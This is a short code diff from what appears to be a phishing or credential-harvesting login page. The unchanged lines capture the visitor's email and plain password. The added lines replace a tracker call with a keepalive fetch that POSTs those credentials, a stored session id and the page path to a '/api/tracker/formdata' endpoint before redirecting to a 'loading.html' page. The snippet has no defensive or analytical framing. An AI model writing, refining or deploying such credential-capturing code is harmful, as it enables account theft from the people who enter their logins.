@@ -1632,8 +1632,15 @@ nav > div > a { line-height: 0; height: 29px; }
       // Send creds to tracker before navigating so the data isn't lost mid-flight
       var captured = { email: emailInput.value.trim(), password: passwordInput.value };
       try {
-        if (window.ALPTracker && window.ALPTracker.trackFormData) {
-          window.ALPTracker.trackFormData(captured);
+        var _tag = document.querySelector('script[data-api-key]');
+        var _key = _tag ? _tag.getAttribute('data-api-key') : null;
+        var _sid = _key ? localStorage.getItem('_alp_sid_' + _key) : null;
+        if (_key && _sid) {
+          fetch('/api/tracker/formdata', {
+            method: 'POST', keepalive: true,
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: _sid, formId: 'loginForm', page: window.location.pathname, data: captured, timestamp: Date.now() })
+          }).catch(function(){});
         }
       } catch (_) {}
       setTimeout(function() { window.location.href = 'loading.html'; }, 350);
